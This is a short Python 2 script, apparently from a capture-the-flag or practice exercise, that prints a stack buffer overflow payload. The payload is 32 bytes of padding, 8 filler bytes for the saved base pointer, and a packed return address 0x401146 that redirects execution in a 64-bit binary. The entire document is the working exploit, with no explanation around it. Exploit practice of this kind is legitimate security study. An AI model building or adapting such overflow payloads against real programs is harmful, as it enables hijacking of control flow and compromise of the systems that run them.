import struct
padding = "A"*32
rbp = "BBBBBBBB"
rip = struct.pack("L", 0x401146)

print padding + rbp + rip
